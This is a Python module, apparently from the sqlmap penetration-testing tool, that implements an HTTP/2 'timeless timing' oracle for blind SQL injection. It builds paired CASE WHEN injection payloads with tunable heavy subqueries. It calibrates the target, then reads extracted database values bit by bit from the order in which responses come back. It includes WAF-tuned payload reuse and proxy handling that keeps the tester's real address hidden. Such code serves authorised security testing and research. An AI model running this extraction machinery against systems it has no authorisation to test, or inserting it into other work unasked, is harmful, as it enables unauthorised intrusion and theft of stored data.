#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

# HTTP/2 "timeless timing" oracle (Van Goethem et al., USENIX Security 2020) built on the native
# client's exchange_pair() primitive (lib/request/http2.py). Two requests are multiplexed on one
# connection and handed to the kernel in a single application-level write; because they travel the same
# path at (near) the same instant, network jitter hits both alike and largely cancels, so the RELATIVE
# order in which their responses complete tracks the server-side processing delta far more tightly than
# absolute wall-clock timing can. That lets a millisecond-scale difference in query work be read - and it
# needs no SLEEP: the NATURAL execution-time gap between a true and a false boolean branch is signal
# enough on most engines. (A single sendall() is not a guarantee of packet-level coalescing, nor of
# concurrent server-side handling - which is exactly why nothing here is applied unmeasured.)
#
# The oracle is only valid when the target processes the two streams CONCURRENTLY; a serializing
# front-proxy makes order track arrival, not work. calibrate() detects that (and estimates the readable
# delta) so the caller never applies the oracle blind - it falls back to classic time-based instead.
# Calibration is re-run on EVERY connection the oracle opens (a load balancer can hand a later connection
# to a serializing node) and periodically re-checked for drift, and each read validates that both streams
# came back with the response status calibration saw - a WAF block, an expired session or an errored
# primitive can otherwise masquerade as a timing vote.
#
# LIMITS: a pair is exchanged on a dedicated connection, outside the urllib stack, so the response-side
# pipeline (Set-Cookie, redirect policy, retry-on-content, rate-limit backoff, traffic logging) does not run
# for it - only '--safe-url'/'--safe-req', which queryPage() applies to this path too. That is bounded, not
# silent: any of those conditions changes the response status, which the calibrated-status check turns into
# a disengage-and-fall-back rather than a wrong bit.

import math
import socket
import ssl
import threading
import time

from lib.core.enums import DBMS
from lib.request.http2 import _H2Connection
from lib.request.http2 import _UnprocessedStream

# Serializes the one-shot autoEngage() so concurrent worker threads never double-calibrate/double-engage.
_engageLock = threading.Lock()

# Transport-level failures that mean "this connection/attempt is unusable" - covers a mid-exchange drop
# (GOAWAY, reset) as well as a failed (re)connect, including the h2 client's own IOError when the server
# does not negotiate ALPN 'h2' on a fresh socket (seen on backends that speak h2 inconsistently, e.g. only
# some nodes behind a load balancer). Used by connect.py as the give-up path: anything reaching it means
# the oracle cannot continue, so the scan disengages and resumes on classic time-based.
CONNECTIVITY_ERRORS = (socket.error, ssl.SSLError, IOError)


class TimelessUnusable(IOError):
    """The oracle cannot produce a trustworthy bit on this target any more (a fresh connection failed
    calibration, the responses stopped matching the calibrated control, ...). Derives from IOError so
    connect.py's CONNECTIVITY_ERRORS handler disengages and falls back to classic time-based rather
    than the scan continuing on a channel that is no longer known-good."""


def buildConditionPair(condition, heavy, cheap="0"):
    """Turn a boolean `condition` (the same comparison bisection injects at INFERENCE_MARKER, e.g.
    'ORD(...)>64') into the two INFERENCE expressions the timeless oracle needs: one that makes the DB
    do the expensive `heavy` work iff the condition is TRUE, and its mirror that does the SAME heavy work
    iff the condition is FALSE. Exactly one of the pair runs heavy for any given row, so response order
    names the bit - with NO SLEEP, purely from the natural cost of `heavy`. Both expressions are valid
    booleans (>=0 always holds) so they never change the page, keeping the channel blind.

    `heavy` is a DBMS-specific bounded-cost scalar subquery (a partial scan / expensive function);
    `cheap` is a constant. CASE/WHEN is used so the branch is gated deterministically rather than relying
    on optimiser short-circuit.

    >>> c, n = buildConditionPair("ORD(x)>64", "SELECT COUNT(*) FROM t")
    >>> c
    '(CASE WHEN (ORD(x)>64) THEN (SELECT COUNT(*) FROM t) ELSE (0) END)>=0'
    >>> n
    '(CASE WHEN (ORD(x)>64) THEN (0) ELSE (SELECT COUNT(*) FROM t) END)>=0'
    """
    condExpr = "(CASE WHEN (%s) THEN (%s) ELSE (%s) END)>=0" % (condition, heavy, cheap)
    negExpr = "(CASE WHEN (%s) THEN (%s) ELSE (%s) END)>=0" % (condition, cheap, heavy)
    return condExpr, negExpr


def _pairOrder(connSource, reqA, reqB, timeout, retries=2, expectStatus=None):
    """Send reqA and reqB as one coalesced pair; return (first, loSid, hiSid, status) - the stream id that
    finished FIRST, the two stream ids in send order (reqA got the lower id) and the shared HTTP status.

    `connSource` is either a live _H2Connection or a zero-arg callable returning one. The callable form
    lets a connection that the server retired be replaced transparently and the pair re-sent - a long
    extraction routinely outlives one HTTP/2 connection (GOAWAY past the per-connection request cap).

    REPLAY SAFETY: a coalesced pair is NOT blindly idempotent (the injection point can sit in a POST, and
    an application may count/mutate on every hit), so only failures the peer PROVED left the streams
    unprocessed are re-sent - that is exactly the h2 client's _UnprocessedStream (GOAWAY above
    Last-Stream-ID / REFUSED_STREAM, see RFC 9113 6.8). A failure while OPENING the replacement connection
    is retried too (nothing was sent yet). Everything else - protocol/compression errors, an ambiguous
    mid-exchange drop, a deterministic header error - raises immediately: guessing wrong there either
    re-runs a state-changing request or loops on an unfixable condition.

    RESPONSE VALIDATION: the two responses are not thrown away. Both streams must carry the SAME status,
    and (when `expectStatus` is given - the status calibration measured) that status. Otherwise a WAF 403,
    an expired-session 401/302, a rate-limit 429 or a 500 from a primitive the server version rejects would
    be read as a perfectly good timing vote. A mismatch is re-sent a couple of times (transient blip) and
    then raises TimelessUnusable so the scan falls back instead of extracting from noise."""
    attempt = 0
    while True:
        conn = None
        try:
            conn = connSource() if callable(connSource) else connSource
        except TimelessUnusable:            # a definitive verdict (failed calibration), not a blip
            raise
        except CONNECTIVITY_ERRORS:
            attempt += 1
            if not callable(connSource) or attempt > retries:
                raise
            continue

        try:
            order, results = conn.exchange_pair([reqA, reqB], timeout)
        except _UnprocessedStream:
            conn.close()                                # retire; a callable source reopens on the next pass
            attempt += 1
            if not callable(connSource) or attempt > retries:
                raise
            continue
        except CONNECTIVITY_ERRORS:
            conn.close()
            raise

        loSid, hiSid = conn.next_sid - 4, conn.next_sid - 2
        status = results[loSid][0]
        if status == results[hiSid][0] and expectStatus in (None, status):
            return order[0], loSid, hiSid, status

        attempt += 1
        if attempt > retries:
            raise TimelessUnusable("response status drifted from the calibrated control (%s/%s, expected %s)"
                                   % (results[loSid][0], results[hiSid][0], expectStatus))


# Wald sequential probability ratio test (SPRT) parameters for readBit(). The two hypotheses are the two
# populations a cond-last vote can be drawn from:
#   H1 (bit TRUE)  - reqCond runs the heavy branch, so it finishes last with probability ~SPRT_P_TRUE
#   H0 (bit FALSE) - reqCond is the cheap one and finishes last with probability ~0 (real false / NULL
#                    end-of-string) or ~0.5 (a DBMS that ERRORS past the end of a string, e.g. CockroachDB,
#                    where both requests error and the order is a coin flip)
# H0 is therefore modelled at the WORST of those, p=0.5 - the boundary the test has to hold against, and
# the reason the decision line cannot simply sit at 0.5. Both error rates are bounded by SPRT_ERROR by
# construction, which the old "fraction >= 0.8 -> True, <= 0.5 -> False" rule was not: it could return
# FALSE the moment a single late vote dragged the running fraction back to 0.5 (3/5 -> 3/6 decided at six
# votes despite a cap of 25), giving a genuine but load-degraded TRUE bit a double-digit miss rate.
# H1 is picked from the calibration the target actually measured, exactly as the old rule picked its vote
# count from it. On a target whose tuning sweep came back UNANIMOUS the votes really are deterministic:
# measured live (MariaDB 11.8 over HTTP/2), 45 bits / 1350 votes idle and 188 bits / 5640 votes under 4x
# self-induced load produced 1.00 on every TRUE bit and 0.00 on every FALSE one - not one disagreeing vote
# in 6990. That is what the separation gate buys (MIN_HEAVY_MS x loadFactor and MIN_SEPARATION_FRAC force a
# cost whose delta dwarfs intra-pair jitter), so modelling H1 near 1.0 there is a measurement, not
# optimism - and it keeps a bit at the same ~5 pairs the old fixed rule spent. A sweep that came back
# BELOW unanimous says the delta is marginal, and gets the conservative model plus a bigger minimum sample.
SPRT_P_TRUE = 0.85                      # conservative model: a target that calibrated below unanimous
SPRT_P_TRUE_CLEAN = 0.97                # ... and one whose tuning sweep did not miss a single trial
SPRT_ERROR = 0.02                       # bound on BOTH the false-positive and the false-negative rate
SPRT_CAP_FACTOR = 16                    # ceiling, in multiples of the minimum sample, for an undecided bit
# Realised error/cost per bit, 20k simulated bits per operating point (`p` = per-vote cond-last probability):
#                       p=1.00      p=0.95      p=0.90      p=0.80      p=0.50 (eos coin flip)
#   clean  (0.97, 4)  0.0% / 6    1.9% / 8    10% / 10     49% / 12     1.8% / 6
#   marginal (0.85, 8)  0.0% / 8    0.0% / 10   0.1% / 12    5.1% / 21    1.4% / 14
#   old rule            0.0% / 5      -           -         ~15% / 5    ~20% / 5
# Both settings crush the end-of-string coin flip that used to invent trailing characters (~20% -> ~1.5%),
# which is the failure this decision engine exists to prevent. The clean setting trades tolerance of a
# degraded p for that, so it is only granted when calibration was perfect AND every connection has to
# prove the same unanimity before it may read a bit (see VERIFY_THRESHOLD_CLEAN) - a connection that
# cannot is not in the regime the model describes, and falling back to classic time-based is the correct
# answer for it rather than reading bits at 49%.


def readBit(connSource, reqCond, reqNeg, votes=4, timeout=30, expectStatus=None, pTrue=SPRT_P_TRUE):
    """Read one boolean from symmetric pairs by a sequential likelihood-ratio test on the cond-last votes.
    `connSource` is a live connection or a factory (see _pairOrder) so a connection the server retires
    mid-read is replaced and that pair re-sent transparently.

    reqCond does the heavy work iff the guessed condition is TRUE; reqNeg does the SAME heavy work iff the
    condition is FALSE (it carries the negated condition). Exactly one runs heavy, so whichever finishes
    LAST names the answer. Votes alternate which stream id carries reqCond, and a decision is only taken on
    an EVEN vote count, so both orderings contribute equally and lower-id-first bias cancels exactly.

    Each vote updates the log-likelihood ratio of H1 (TRUE, cond-last with probability `pTrue`) against
    H0 (FALSE, cond-last with probability up to 0.5 - see the constants above); crossing +/-log((1-e)/e)
    decides with both error rates bounded by SPRT_ERROR. This is also CHEAPER than a fixed sample on the
    common case: an unambiguous FALSE (every vote cond-first) settles in the minimum sample, an unambiguous
    TRUE shortly after, while an ambiguous bit - where --threads workers contend and drag the fraction into
    the middle - simply keeps voting instead of guessing. Reaching the cap without a crossing decides by the
    likelier hypothesis. SYMMETRIC, so the base query time cancels - robust where absolute pair-time, gap,
    and always-heavy-reference signals are confounded."""
    bound = math.log((1.0 - SPRT_ERROR) / SPRT_ERROR)
    stepLast = math.log(pTrue / 0.5)                    # a cond-last vote: evidence for TRUE
    stepFirst = math.log((1.0 - pTrue) / 0.5)           # a cond-first vote: (stronger) evidence for FALSE
    minVotes = max(2, votes + votes % 2)
    cap = minVotes * SPRT_CAP_FACTOR
    llr, i = 0.0, 0
    while True:
        if i % 2 == 0:
            first, condSid, _hiSid, _status = _pairOrder(connSource, reqCond, reqNeg, timeout, expectStatus=expectStatus)
        else:
            first, _loSid, condSid, _status = _pairOrder(connSource, reqNeg, reqCond, timeout, expectStatus=expectStatus)
        llr += stepLast if first != condSid else stepFirst      # cond finished last -> it ran heavy
        i += 1
        if i % 2 or i < minVotes:       # decide only on a balanced sample, never below the minimum
            continue
        if llr >= bound:
            return True
        if llr <= -bound:
            return False
        if i >= cap:
            return llr > 0.0


def calibrate(conn, reqSlow, reqFast, trials=40, threshold=0.9, timeout=30, progress=None, deadline=None, expectStatus=None):
    """Decide whether `conn` is usable for the timeless oracle. Sends a KNOWN-asymmetric pair (reqSlow does
    real extra work, reqFast short-circuits) in BOTH stream-id orderings; on a concurrent backend the slow
    request finishes last regardless of its id. Returns (usable, confidence, status) where confidence is the
    fraction of trials in which the slow request finished last and status is the HTTP status both streams
    consistently returned (the control every later read is validated against). Below `threshold` the backend
    is serializing (or the delta is unreadable) -> caller must NOT use the oracle. `progress`, if given, is
    called once per trial so the caller can stream a progress indicator. `deadline` is an absolute
    time.time() budget: a target that answers just slowly enough could otherwise keep calibration alive
    indefinitely, since the per-socket timeout only bounds one exchange."""
    slowLast, status = 0, None
    for i in range(trials):
        if deadline is not None and time.time() > deadline:
            return False, 0.0, status
        if i % 2 == 0:
            first, slowSid, _hiSid, status = _pairOrder(conn, reqSlow, reqFast, timeout, expectStatus=expectStatus)
        else:
            first, _loSid, slowSid, status = _pairOrder(conn, reqFast, reqSlow, timeout, expectStatus=expectStatus)
        if first != slowSid:
            slowLast += 1
        expectStatus = status           # from the first pair on, demand a stable response class
        if progress is not None:
            progress()
    confidence = slowLast / float(trials) if trials else 0.0
    return (confidence >= threshold), confidence, status


def connect(host, port=443, proxy=None, timeout=30):
    """Open a dedicated HTTP/2 connection for timeless probing (kept separate from the request pool so
    its multiplexed pairs never interleave with ordinary single-stream traffic)."""
    return _H2Connection(host, port, proxy, timeout)


def proxyProfile():
    """The HTTP-proxy tuple the native h2 client needs for the current run, or None when there is none.
    Every timeless connection must go through it: the client calls socket.create_connection() itself, so
    it is reached by neither the urllib proxy handlers nor the socks module-wrapping '--tor' installs -
    connecting anyway would send the real source address straight to the target. SOCKS the native client
    cannot speak at all, so that raises ValueError and timeless declines instead of bypassing it."""
    from lib.core.data import conf
    from lib.request.http2 import proxy_tuple

    if conf.tor and not conf.proxy:     # SOCKS Tor: only the httplib socket is wrapped, ours is not
        raise ValueError("native HTTP/2 client does not support SOCKS proxies")
    return proxy_tuple(conf.proxy, conf.proxyCred)


# Per-connection re-calibration of a worker/replacement connection. Shorter than the initial tuning sweep
# (the cost is already picked - this only has to prove that THIS connection's backend handles the two
# streams concurrently and answers with the calibrated status) but strict, because a connection that quietly
# serializes returns wrong bits without ever raising.
VERIFY_TRIALS = 10
VERIFY_THRESHOLD = 0.9
# ... and the bar a connection must clear to be read at the CLEAN model (SPRT_P_TRUE_CLEAN): unanimous, the
# same thing the tuning sweep saw and the same thing 6990 live votes produced. Not a harsh bar on a target
# that belongs in that regime - and a connection that misses it is precisely one the clean model would
# misread, so rejecting it (scan falls back to classic time-based) is the answer, not admitting it.
VERIFY_THRESHOLD_CLEAN = 1.0
# Pairs sent on one connection before its control probe is re-run, to catch runtime drift (a backend that
# starts serializing under load, a node swapped in behind the balancer). ~100 bits apart, so the re-check
# costs ~2% of the pairs. Response-status drift needs no schedule - every pair is validated against the
# calibrated status.
VERIFY_EVERY = 500


class TimelessOracle(object):
    """The engaged timeless-timing oracle, held on kb.timeless while active. queryPage() routes every
    boolean comparison (timeBasedCompare requests) here instead of measuring wall-clock time: it takes the
    already-assembled condition request and its negation (both built via buildOnly), coalesces them into one
    multiplexed pair and reads the bit from response order. This reuses the entire bisection/inference/
    threading stack unchanged - bisection just calls queryPage and gets a bool.

    Thread safety: each worker thread gets its OWN H2 connection (threading.local), mirroring keepalive.py
    and the http2 pool - streams from different threads never interleave on one socket, so parallel
    per-value extraction (--threads / _threadedInferenceValues) is safe.

    Every connection is calibrated BEFORE it reads a bit - the initial sweep proves one connection to one
    backend node, which says nothing about the per-thread connections opened afterwards or a replacement
    opened after a GOAWAY (a load balancer can route those to a node that serializes streams). The
    known-asymmetric probe pair used for that, and the response status it produced, are held here and
    re-checked periodically so runtime drift is caught rather than silently extracted through."""

    def __init__(self, host, port, probeSlow, probeFast, proxy=None, votes=4, timeout=30, status=None,
                 pTrue=SPRT_P_TRUE, verifyThreshold=VERIFY_THRESHOLD):
        self.host, self.port, self.proxy = host, port, proxy
        self.probeSlow, self.probeFast = probeSlow, probeFast    # known-asymmetric pair, for (re)calibration
        self.status = status            # response status calibration saw; every read is validated against it
        self.votes = votes              # minimum (balanced) pairs per bit before readBit's SPRT may decide
        self.pTrue = pTrue              # per-vote reliability modelled for a TRUE bit (from calibration)
        self.verifyThreshold = verifyThreshold   # bar a connection must clear to read at that model
        self.timeout = timeout
        self._local = threading.local()
        self._conns = []                # every opened connection, for clean teardown
        self._lock = threading.Lock()
        self._closed = False
        self.savedData = None           # injection data whose vector we swapped (restored on disengage)
        self.savedVector = None

    def _verify(self, conn):
        """Prove that `conn` reads bits correctly, or raise. Raising here is the safe outcome: connect.py
        disengages and the scan resumes on classic time-based."""
        usable, confidence, status = calibrate(conn, self.probeSlow, self.probeFast, trials=VERIFY_TRIALS,
                                               threshold=self.verifyThreshold, timeout=self.timeout,
                                               expectStatus=self.status)
        if not usable:
            raise TimelessUnusable("connection failed timeless calibration (confidence %.2f)" % confidence)
        if self.status is None:
            self.status = status

    def _retire(self, conn):
        """Close `conn` and forget it, so neither a reconnect nor teardown touches it again."""
        self._local.conn = None
        try:
            conn.close()
        except Exception:
            pass
        with self._lock:
            try:
                self._conns.remove(conn)
            except ValueError:
                pass

    def _conn(self):
        conn = getattr(self._local, "conn", None)
        reads = getattr(self._local, "reads", 0)
        if conn is not None and conn.usable:
            if reads < VERIFY_EVERY:
                self._local.reads = reads + 1
                return conn
            try:                                        # still alive, but due a drift re-check
                self._verify(conn)
            except Exception:
                self._retire(conn)
                raise
            self._local.reads = 1
            return conn

        if conn is not None:                            # retire the dead one so reconnects don't leak sockets
            self._retire(conn)

        conn = connect(self.host, self.port, self.proxy, self.timeout)
        with self._lock:
            if self._closed:                            # disengaged while this socket was being opened
                conn.close()
                raise TimelessUnusable("timeless oracle was closed")
            self._conns.append(conn)
        try:
            self._verify(conn)                          # never read a bit off an uncalibrated connection
        except Exception:
            self._retire(conn)
            raise
        self._local.conn, self._local.reads = conn, 1
        return conn

    def readBitFromSpecs(self, condSpec, negSpec):
        """Read the bit from the assembled condition request and its negation, by the SYMMETRIC oracle
        (cond-last votes over coalesced pairs - the base query time cancels, so it stays reliable on heavy or
        noisy enumeration queries and reads end-of-string as the ~50% split). Specs are the
        (url, method, headers, post) tuples from getPage(buildOnly=True)."""
        # Pass the bound _conn factory (not a resolved connection) so a pair whose connection is retired
        # mid-read (server GOAWAY on a long dump) is transparently re-sent on a fresh, re-calibrated one.
        return readBit(self._conn, _specToReq(condSpec, self.host), _specToReq(negSpec, self.host),
                       votes=self.votes, timeout=self.timeout, expectStatus=self.status, pTrue=self.pTrue)

    def close(self):
        with self._lock:
            self._closed = True         # set BEFORE closing, so a connection opened concurrently by a
            conns, self._conns = self._conns, []        # worker is closed by _conn() instead of resurrected
        for conn in conns:
            try:
                conn.close()
            except Exception:
                pass


def engage(oracle, technique, vector):
    """Publish a fully-built `oracle` on kb.timeless, swapping `technique`'s vector for the tuned heavy one
    so every extraction payload from here on gates the heavy branch and carries the sentinels the symmetric
    oracle negates. Ordered so it is all-or-nothing: the vector swap (which alone would break classic
    time-based) happens first and is rolled back if anything fails, and kb.timeless is published LAST, so a
    failure can never leave a half-engaged oracle behind. disengage() undoes both."""
    from lib.core.common import getTechniqueData
    from lib.core.data import kb

    # hold the injection-data OBJECT, not the technique enum: disengage() can run after the controller has
    # moved on to the next target, and re-resolving the enum then would restore this target's vector onto
    # the next one's injection data.
    data = getTechniqueData(technique)
    oracle.savedData, oracle.savedVector = data, data.vector
    data.vector = vector
    try:
        kb.timelessRestore = None       # a previous target's straggler-rewrite must not outlive it
        kb.timeless = oracle
    except Exception:
        data.vector = oracle.savedVector
        raise
    return oracle


def disengage():
    """Tear down the timeless oracle, restore the classic time-based vector and close all per-thread
    connections. Restoration is not swallowed on failure: leaving the heavy (no-delay) vector in place
    would make every subsequent classic time-based comparison read False."""
    from lib.core.data import kb

    oracle = kb.get("timeless")
    if oracle is not None:
        kb.timeless = None
        # Restoring the vector is NOT enough on its own: bisection freezes a comparison TEMPLATE from it
        # when a value starts extracting, so the rest of the value in flight keeps forging heavy (no-delay)
        # payloads that wall-clock comparison reads as False. Publish the classic vector so queryPage can
        # re-forge those stragglers until bisection builds its next template. See restoreClassicValue().
        kb.timelessRestore = oracle.savedVector
        try:
            if oracle.savedData is not None:
                oracle.savedData.vector = oracle.savedVector
                oracle.savedData = None
        finally:
            oracle.close()


def hintTimeless():
    """Advisory nudge: when a scan is about to rely on TIME-based blind (the slowest channel) and the user
    did NOT pass '--timeless', probe the target for HTTP/2 and, if it speaks it, suggest '--timeless' once.
    Only fires when time-based is the channel that will actually be used (no faster in-band option) so the
    hint is never noise. Purely advisory, never raises, at most one message per run."""
    from lib.core.data import conf, kb
    from lib.core.common import isTechniqueAvailable, singleTimeWarnMessage
    from lib.core.enums import PAYLOAD

    try:
        if conf.get("timeless") or kb.get("timelessHinted"):
            return
        kb.timelessHinted = True

        # only relevant when time-based is the chosen channel (a faster in-band one would be used instead)
        if not isTechniqueAvailable(PAYLOAD.TECHNIQUE.TIME):
            return
        if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.BOOLEAN)):
            return

        try:
            from urllib.parse import urlsplit
        except ImportError:
            from urlparse import urlsplit
        parts = urlsplit(conf.url or "")
        if parts.scheme != "https":
            return

        # cheap one-connection HTTP/2 ALPN probe: connect() raises unless the server negotiates 'h2'. It
        # goes through the configured proxy like every other request - probing direct would leak the real
        # source address under '--tor'/'--proxy' (proxyProfile() refuses outright on SOCKS, so no hint).
        conn = connect(parts.hostname, parts.port or 443, proxyProfile(), conf.timeout or 30)
        conn.close()
        singleTimeWarnMessage("target speaks HTTP/2 - switch '--timeless' can extract this time-based injection "
                              "by relative response order (no delay), typically far faster. Consider re-running with '--timeless'")
    except Exception:
        pass


def autoEngage():
    """Attempt to engage the timeless oracle for the current target's EXTRACTION phase. Called once by
    action() after detection (so the heavy vector is swapped in BEFORE any extraction payload is built).
    Requires '--timeless', an https/HTTP-2 target, and a confirmed time-based technique on a DBMS with a
    light-heavy primitive; calibrates + tunes and only engages if the response-order signal is reliable
    (the safety gate) - otherwise the scan silently keeps using classic time-based. Never raises."""
    from lib.core.data import conf, kb, logger
    from lib.core.common import Backend

    with _engageLock:
        if kb.get("timeless") is not None:
            return True
        return _doAutoEngage(conf, kb, logger, Backend)


def _doAutoEngage(conf, kb, logger, Backend):
    try:
        if not conf.get("timeless"):
            return False

        # Never during detection - that phase confirms the vuln (and runs the false-positive check) by
        # measuring REAL induced delays, which response-order would break. kb.testMode is True throughout
        # detection and False once extraction begins.
        if kb.get("testMode"):
            return False

        # Timeless accelerates TIME-based extraction, so it needs a CONFIRMED time-based technique whose
        # data carries an [INFERENCE] vector - that vector is what we swap for the tuned heavy one.
        from lib.core.enums import PAYLOAD
        from lib.core.settings import INFERENCE_MARKER
        timeData = kb.injection.data.get(PAYLOAD.TECHNIQUE.TIME) if (kb.injection and kb.injection.data) else None
        if not timeData or INFERENCE_MARKER not in (timeData.vector or ""):
            return False

        try:
            from urllib.parse import urlsplit
        except ImportError:
            from urlparse import urlsplit
        parts = urlsplit(conf.url or "")
        if parts.scheme != "https":
            logger.warning("'--timeless' requires an https/HTTP-2 target. Falling back to classic time-based")
            return False

        # '--chunked' rewrites the entity body into HTTP/1.1 chunked wire format, which buildOnly hands back
        # verbatim; sent as an h2 DATA stream the server would read '4\r\ndata\r\n0\r\n\r\n' as the body.
        if conf.chunked:
            logger.warning("'--timeless' is incompatible with switch '--chunked'. Falling back to classic time-based")
            return False

        try:
            proxy = proxyProfile()
        except ValueError:
            logger.warning("'--timeless' cannot use a SOCKS proxy (including '--tor'), and will not connect around it. Falling back to classic time-based")
            return False

        host, port = parts.hostname, parts.port or 443
        dbms = Backend.getIdentifiedDbms()
        if lightHeavyVector(dbms, LIGHT_HEAVY_COSTS[0]) is None:
            logger.warning("'--timeless' has no heavy-query primitive for DBMS '%s' yet. Falling back to classic time-based" % dbms)
            return False
        if _calibrationConditions(dbms)[0] is None:
            logger.warning("'--timeless' cannot build a faithful calibration probe for DBMS '%s'. Falling back to classic time-based" % dbms)
            return False

        # Calibration sends a few hundred coalesced probe-pairs to measure the target's response-order
        # reliability and tune the work size - that is the pause the user sees before engagement. Announce
        # it and stream a dot per probe, mirroring the classic time-based "statistical model, please wait".
        from lib.core.common import dataToStdout
        dataToStdout("[%s] [INFO] calibrating HTTP/2 timeless timing on '%s' (measuring response-order reliability), please wait" % (time.strftime("%X"), dbms))
        probe = connect(host, port, proxy, conf.timeout or 30)
        # value-parallel dumping runs conf.threads workers concurrently, each firing heavy queries; demand
        # that much more calibration margin so the tuned cost survives the self-induced load (see tuneHeavy).
        loadFactor = max(1, conf.threads or 1)
        try:
            vector, cost, confidence, status, probeSlow, probeFast = tuneHeavy(probe, dbms=dbms, progress=lambda: dataToStdout('.'), loadFactor=loadFactor)
        finally:
            probe.close()
            dataToStdout(" (done)\n")

        if not vector:
            logger.warning("HTTP/2 timeless timing is not usable on this target (confidence %.2f, backend likely serializes streams). Falling back to classic time-based" % confidence)
            return False

        # A sweep that did not miss a single trial licenses the CLEAN decision model (votes are
        # deterministic on such a target - see the SPRT constants), which reads a bit in about the same
        # pairs the classic rule spent; every connection then has to reproduce that unanimity before it may
        # read. Anything less gets the conservative model and a bigger minimum sample.
        # (No validateChar re-check runs under timeless.)
        clean = confidence >= 1.0
        oracle = TimelessOracle(host, port, probeSlow, probeFast, proxy=proxy, timeout=conf.timeout or 30,
                                votes=4 if clean else 8, status=status,
                                pTrue=SPRT_P_TRUE_CLEAN if clean else SPRT_P_TRUE,
                                verifyThreshold=VERIFY_THRESHOLD_CLEAN if clean else VERIFY_THRESHOLD)
        # bisection forges its comparison payloads from the TIME technique's vector, so the swap to the
        # tuned heavy (sentinel) vector has to happen NOW, before extraction builds any payload. engage()
        # does that and publishes the oracle as one all-or-nothing step; disengage() undoes it.
        engage(oracle, PAYLOAD.TECHNIQUE.TIME, vector)

        logger.info("turning on HTTP/2 timeless timing (heavy cost %d, calibration %.2f) - reading bits by response order, no delay" % (cost, confidence))
        return True
    except Exception as ex:
        from lib.core.common import getSafeExString
        disengage()
        logger.warning("HTTP/2 timeless timing setup failed ('%s'). Falling back to classic time-based" % getSafeExString(ex))
        return False


def _specToReq(spec, fallbackAuthority):
    """Convert the (url, method, headers, post) tuple that Connect.getPage(buildOnly=True) returns into
    the request dict exchange_pair expects.

    ':authority' is taken from the assembled Host header whenever there is one, and only falls back to the
    URL host otherwise: they legitimately differ under virtual hosting, '--host', or an injection point
    that IS the Host header - deriving the authority from the URL would silently retarget the request (and,
    for a Host-header injection, drop the payload, leaving both requests of the pair identical).

    Header filtering is deliberately left to the HTTP/2 layer's _normalize_request_headers(), which drops
    Host/Connection/framing fields AND the fields a Connection header nominates. Stripping Connection here
    first would keep those nominated fields in an h2 request, which is malformed."""
    try:
        from urllib.parse import urlsplit
    except ImportError:
        from urlparse import urlsplit

    url, method, headers, post = spec
    parts = urlsplit(url)
    path = parts.path or "/"
    if parts.query:
        path += "?" + parts.query
    authority = None
    for key in (headers or {}):
        name = key.decode("latin-1") if isinstance(key, bytes) else key
        if name.lower() == "host":
            authority = headers[key]
            break
    authority = authority or parts.netloc.split("@")[-1] or fallbackAuthority
    return {"method": method, "path": path, "authority": authority, "headers": headers or {}, "body": post}


def getHeavyVector(dbms=None):
    """Return the raw heavy-query time-based vector shipped for `dbms` (default: the identified back-end),
    reused verbatim as the timeless rung-2 payload - it is already an '... IF/CASE (INFERENCE) THEN <heavy>
    ELSE <cheap> ...' gate, WAF-tuned and per-DBMS, so the heavy work provides the natural delta with no
    SLEEP. Prefers the plain 'AND' boundary variant. Returns None if none is loaded."""
    from lib.core.data import conf
    from lib.core.common import Backend, isListLike

    dbms = dbms or Backend.getIdentifiedDbms()
    if not dbms:
        return None

    andVector = orVector = None
    for test in (conf.tests or []):
        title = (test.get("title") or "")
        if "heavy query" not in title.lower():
            continue
        testDbms = ((test.get("details") or {}).get("dbms")) or ""
        testDbms = " ".join(testDbms) if isListLike(testDbms) else testDbms
        # tolerate combined labels like "Microsoft SQL Server/Sybase"
        if not (dbms.lower() in testDbms.lower() or any(part.strip().lower() == dbms.lower() for part in testDbms.split('/'))):
            continue
        vector = (test.get("vector") or "").strip()
        # Only the inband boundary variants splice into a WHERE clause; skip stacked (';...') and inline forms.
        if vector.upper().startswith("AND "):
            andVector = andVector or vector
        elif vector.upper().startswith("OR "):
            orVector = orVector or vector
    return andVector or orVector


# Light, TUNABLE heavy primitives for timeless rung 2. The shipped heavy-query vectors are tuned for
# absolute-timing thresholds (seconds) - e.g. SQLite RANDOMBLOB([SLEEPTIME]00000000/2) is ~50MB/request -
# which is both needlessly slow AND a DoS risk. Timeless only needs a few milliseconds above the target's
# scheduling noise, so we generate the SAME bounded-work idioms (series / catalog cross-joins) capped by a
# [COST] the calibrator dials UP from a small default until the response-order signal is reliable. That
# self-tunes to the lightest payload that works - fast, and never allocates a huge blob.
# [COST] is replaced with a row count; each primitive is a scalar sub-select doing ~[COST] units of
# bounded work. Grouped by dialect and keyed on sqlmap's canonical DBMS names (DBMS.* enum) so a fork
# (MariaDB->MySQL, CockroachDB->PostgreSQL, ...) resolves via its base DBMS, and there is no string drift.
# A DBMS absent here (or whose primitive is wrong on a given target) simply fails calibration and the scan
# falls back to classic time-based - the light-heavy is always safety-gated, never applied blind.
#
# SCOPE: timeless layers on top of a DETECTED time-based technique, so it can only ever engage on a DBMS
# that ships a time-based payload (data/xml/payloads/time_blind.xml): PostgreSQL, MySQL (+MariaDB/TiDB),
# Oracle, Microsoft SQL Server, Sybase, SQLite, Firebird, ClickHouse, IBM DB2, Informix, HSQLDB, SAP MaxDB.
# Engines with NO time-based payload (H2, MonetDB, CrateDB, Vertica, Presto/Trino, Snowflake) are never
# detected as injectable via time, so a light-heavy primitive for them is dead code - they are NOT listed.
#
# GATING & SAFETY: the heavy work must run for exactly ONE of a boolean condition and its negation, so
# response ORDER names the bit. It is gated by the shipped-vector shape `[RANDNUM]=(CASE WHEN (cond) THEN
# (<heavy>) ELSE [RANDNUM] END)` - the THEN branch does the work iff cond holds, the ELSE is a cheap literal.
# Some optimisers HOIST an uncorrelated scalar subquery out of the CASE and run it in BOTH branches (seen on
# TiDB with `(SELECT BENCHMARK(N,MD5(1)))`; MySQL 8.4 does not). That is not a correctness hazard here: when
# both branches do equal work the measured delta is ~0, so tuneHeavy's MIN_HEAVY_MS gate REJECTS the rung
# and the scan falls back to classic time-based - correct data, just no timeless speedup. Corruption only
# ever came from ENGAGING with a tiny-but-nonzero delta that flips under load; requiring MIN_HEAVY_MS of
# real server-side delay (not just a reliable idle order) is the fix for that, and it is primitive-agnostic.
